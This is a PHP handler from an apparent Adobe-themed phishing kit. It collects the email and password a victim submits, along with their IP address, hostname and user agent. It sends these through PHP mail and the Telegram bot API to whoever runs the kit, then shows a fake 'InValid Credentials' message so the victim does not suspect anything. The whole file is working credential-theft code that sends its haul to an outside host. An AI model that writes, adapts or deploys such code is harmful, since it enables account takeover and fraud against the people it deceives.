<?php
include 'telegram.php';
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$detail = trim($_POST['detail']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "[+]━━【Adobe】━━[+]\n";
	$message .= "━━Login From━━: ".$detail."\n";
	$message .= "【Online ID】     : ".$email."\n";
	$message .= "【Passcode】       : ".$password."\n";
	$message .= "|------ I N F O | I P ------|\n";
	$message .= "🗺️ |Client IP: ".$ip."...|🗺️\n";
	$message .= "📍|--- http://www.geoiptool.com/?IP=$ip ---|📍\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "[+]━━【Tele:Goodheart001】━━[+]\n";
	$send = "";
	$subject = "Login : $ip";
    mail($send, $subject, $message);
	$count = $_POST['count'];
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);  
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);    
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>